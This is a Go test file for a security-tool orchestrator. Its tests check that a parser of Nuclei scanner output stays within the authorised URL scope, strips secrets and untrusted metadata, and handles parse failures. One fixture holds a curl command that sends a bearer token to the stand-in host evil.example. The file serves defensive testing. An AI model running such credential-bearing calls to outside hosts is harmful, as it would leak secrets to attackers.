package app

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/ouroboros/ouroboros/internal/compiler"
	"github.com/ouroboros/ouroboros/internal/eventlog"
)

func TestParserEventsForToolExecutionScopesNucleiMatchedURL(t *testing.T) {
	events := parserEventsForToolExecution("run-nuclei-url-scope", ToolExecutionRequest{
		Node: compiler.PlanNode{
			ID:           "nuclei-url-scope:01",
			Capability:   "web.candidate_generation",
			ManifestName: "web-api-pack",
			ToolID:       "nuclei",
			Operation:    "template_scan",
			ParserID:     "nuclei_jsonl",
		},
		ScopeTargets: []ScopeTarget{{Kind: "url", Value: "https://app.example"}},
	}, ToolExecutionResult{
		ExecutionID: "native-nuclei",
		Status:      "completed",
		Transcript:  `{"template-id":"exposure/test","info":{"name":"Unsafe output should not leak","severity":"high","classification":{"cwe-id":["CWE-200"]}},"matched-at":"https://evil.example/leak","host":"https://evil.example","curl-command":"curl https://evil.example/leak -H 'Authorization: Bearer secret-token'","extracted-results":["secret-token"]}`,
	})

	if len(events) != 2 {
		t.Fatalf("expected parser event and one fact event, got %#v", events)
	}
	var payload struct {
		Source     string `json:"source"`
		Statement  string `json:"statement"`
		TemplateID string `json:"template_id"`
		Severity   string `json:"severity"`
		MatchedURL string `json:"matched_url"`
		TargetURL  string `json:"target_url"`
	}
	if err := json.Unmarshal(events[1].Payload, &payload); err != nil {
		t.Fatalf("decode fact event: %v", err)
	}
	if payload.Source != "parser.nuclei_jsonl" || payload.TemplateID != "exposure/test" || payload.Severity != "HIGH" {
		t.Fatalf("unexpected nuclei fact payload: %#v", payload)
	}
	if payload.MatchedURL != "https://app.example" || payload.TargetURL != "https://app.example" {
		t.Fatalf("expected out-of-scope matched URL to collapse to scoped target, got %#v", payload)
	}
	for _, leaked := range []string{"evil.example", "secret-token", "curl "} {
		if strings.Contains(payload.Statement, leaked) {
			t.Fatalf("statement leaked untrusted nuclei output %q: %#v", leaked, payload)
		}
	}
}

func TestParserEventsForToolExecutionRequiresNucleiURLScope(t *testing.T) {
	events := parserEventsForToolExecution("run-nuclei-no-url-scope", ToolExecutionRequest{
		Node: compiler.PlanNode{
			ID:           "nuclei-no-url-scope:01",
			Capability:   "web.candidate_generation",
			ManifestName: "web-api-pack",
			ToolID:       "nuclei",
			Operation:    "template_scan",
			ParserID:     "nuclei_jsonl",
		},
		ScopeTargets: []ScopeTarget{{Kind: "domain", Value: "example.com"}},
	}, ToolExecutionResult{
		ExecutionID: "native-nuclei",
		Status:      "completed",
		Transcript:  `{"template-id":"exposure/test","info":{"name":"No URL scope","severity":"high"},"matched-at":"https://evil.example/leak"}`,
	})

	if len(events) != 1 {
		t.Fatalf("expected one parser failure event without URL scope, got %#v", events)
	}
	if events[0].Type != eventlog.EventParser {
		t.Fatalf("expected parser event, got %#v", events[0])
	}
	var payload struct {
		Parser       string `json:"parser"`
		Status       string `json:"status"`
		FindingCount int    `json:"finding_count"`
	}
	if err := json.Unmarshal(events[0].Payload, &payload); err != nil {
		t.Fatalf("decode parser event: %v", err)
	}
	if payload.Parser != "nuclei_jsonl" || payload.Status != "parse_failed" || payload.FindingCount != 0 {
		t.Fatalf("unexpected no-scope parse-failure payload: %#v", payload)
	}
}

func TestParserEventsForToolExecutionSanitizesNucleiMatchedURLAndMetadata(t *testing.T) {
	events := parserEventsForToolExecution("run-nuclei-url-sanitize", ToolExecutionRequest{
		Node: compiler.PlanNode{
			ID:           "nuclei-url-sanitize:01",
			Capability:   "web.candidate_generation",
			ManifestName: "web-api-pack",
			ToolID:       "nuclei",
			Operation:    "template_scan",
			ParserID:     "nuclei_jsonl",
		},
		ScopeTargets: []ScopeTarget{{Kind: "url", Value: "https://app.example"}},
	}, ToolExecutionResult{
		ExecutionID: "native-nuclei",
		Status:      "completed",
		Transcript:  `{"template-id":"exposure/test","info":{"name":"secret-token","description":"secret-token","severity":"high","classification":{"cwe-id":["CWE-200"],"cve-id":["secret-token"]}},"type":"http","matched-at":"https://user:secret-token@app.example/admin?token=secret-token#frag","matcher-name":"word","curl-command":"curl secret-token","extracted-results":["secret-token"],"host":"secret-token","template-url":"secret-token","request":"secret-token","response":"secret-token"}`,
	})

	if len(events) != 2 {
		t.Fatalf("expected parser event and sanitized fact event, got %#v", events)
	}
	if events[1].Type != eventlog.EventFact {
		t.Fatalf("expected fact event, got %#v", events[1])
	}
	payloadText := string(events[1].Payload)
	if strings.Contains(payloadText, "secret-token") {
		t.Fatalf("nuclei fact payload leaked untrusted metadata: %s", payloadText)
	}
	var rawPayload map[string]json.RawMessage
	if err := json.Unmarshal(events[1].Payload, &rawPayload); err != nil {
		t.Fatalf("decode raw fact event: %v", err)
	}
	for _, forbiddenKey := range []string{"curl-command", "extracted-results", "host", "template-url", "request", "response", "description", "name"} {
		if _, ok := rawPayload[forbiddenKey]; ok {
			t.Fatalf("nuclei fact payload persisted forbidden key %q: %s", forbiddenKey, payloadText)
		}
	}
	var payload struct {
		Statement  string `json:"statement"`
		MatchedURL string `json:"matched_url"`
		TargetURL  string `json:"target_url"`
		CWE        string `json:"cwe"`
		CVE        string `json:"cve"`
	}
	if err := json.Unmarshal(events[1].Payload, &payload); err != nil {
		t.Fatalf("decode fact event: %v", err)
	}
	if payload.MatchedURL != "https://app.example/admin" || payload.TargetURL != "https://app.example" {
		t.Fatalf("expected sanitized URL metadata, got %#v", payload)
	}
	if payload.CWE != "CWE-200" || payload.CVE != "" {
		t.Fatalf("expected validated classification metadata, got %#v", payload)
	}
	if strings.Contains(payload.Statement, "secret-token") || strings.Contains(payload.Statement, "?") || strings.Contains(payload.Statement, "#") || strings.Contains(payload.Statement, "@") {
		t.Fatalf("nuclei statement leaked untrusted URL or metadata: %#v", payload)
	}
}

func TestParserEventsForToolExecutionOrdersNucleiFindings(t *testing.T) {
	events := parserEventsForToolExecution("run-nuclei-order", ToolExecutionRequest{
		Node: compiler.PlanNode{
			ID:           "nuclei-order:01",
			Capability:   "web.candidate_generation",
			ManifestName: "web-api-pack",
			ToolID:       "nuclei",
			Operation:    "template_scan",
			ParserID:     "nuclei_jsonl",
		},
		ScopeTargets: []ScopeTarget{{Kind: "url", Value: "https://app.example"}},
	}, ToolExecutionResult{
		ExecutionID: "native-nuclei",
		Status:      "completed",
		Transcript: strings.Join([]string{
			`{"template-id":"exposure/one","info":{"name":"First finding","severity":"medium"},"matched-at":"https://app.example/one"}`,
			`{"template-id":"exposure/two","info":{"name":"Second finding","severity":"low"},"matched-at":"https://app.example/two"}`,
		}, "\n"),
	})

	if len(events) != 3 {
		t.Fatalf("expected parser event and two ordered fact events, got %#v", events)
	}
	if events[0].Type != eventlog.EventParser || events[1].Type != eventlog.EventFact || events[2].Type != eventlog.EventFact {
		t.Fatalf("expected parser event before fact events, got %#v", events)
	}
	var parserPayload struct {
		Parser       string `json:"parser"`
		Status       string `json:"status"`
		FindingCount int    `json:"finding_count"`
	}
	if err := json.Unmarshal(events[0].Payload, &parserPayload); err != nil {
		t.Fatalf("decode parser event: %v", err)
	}
	if parserPayload.Parser != "nuclei_jsonl" || parserPayload.Status != "parsed" || parserPayload.FindingCount != 2 {
		t.Fatalf("unexpected parser payload: %#v", parserPayload)
	}
	var first struct {
		TemplateID string `json:"template_id"`
		MatchedURL string `json:"matched_url"`
	}
	if err := json.Unmarshal(events[1].Payload, &first); err != nil {
		t.Fatalf("decode first fact event: %v", err)
	}
	var second struct {
		TemplateID string `json:"template_id"`
		MatchedURL string `json:"matched_url"`
	}
	if err := json.Unmarshal(events[2].Payload, &second); err != nil {
		t.Fatalf("decode second fact event: %v", err)
	}
	if first.TemplateID != "exposure/one" || first.MatchedURL != "https://app.example/one" {
		t.Fatalf("unexpected first fact payload: %#v", first)
	}
	if second.TemplateID != "exposure/two" || second.MatchedURL != "https://app.example/two" {
		t.Fatalf("unexpected second fact payload: %#v", second)
	}
}

func TestParserEventsForToolExecutionRecordsNucleiParseFailureWithoutFact(t *testing.T) {
	events := parserEventsForToolExecution("run-nuclei-parse-failure", ToolExecutionRequest{
		Node: compiler.PlanNode{
			ID:           "nuclei-parse-failure:01",
			Capability:   "web.candidate_generation",
			ManifestName: "web-api-pack",
			ToolID:       "nuclei",
			Operation:    "template_scan",
			ParserID:     "nuclei_jsonl",
		},
		ScopeTargets: []ScopeTarget{{Kind: "url", Value: "https://app.example"}},
	}, ToolExecutionResult{
		ExecutionID: "native-nuclei",
		Status:      "completed",
		Transcript:  "not-jsonl",
	})

	if len(events) != 1 {
		t.Fatalf("expected one parse-failure event, got %#v", events)
	}
	if events[0].Type != eventlog.EventParser {
		t.Fatalf("expected parser event, got %#v", events[0])
	}
	var payload struct {
		Parser       string `json:"parser"`
		Status       string `json:"status"`
		ToolID       string `json:"tool_id"`
		FindingCount int    `json:"finding_count"`
		Message      string `json:"message"`
	}
	if err := json.Unmarshal(events[0].Payload, &payload); err != nil {
		t.Fatalf("decode parser event: %v", err)
	}
	if payload.Parser != "nuclei_jsonl" || payload.Status != "parse_failed" || payload.ToolID != "nuclei" || payload.FindingCount != 0 || payload.Message == "" {
		t.Fatalf("unexpected parse-failure payload: %#v", payload)
	}
}
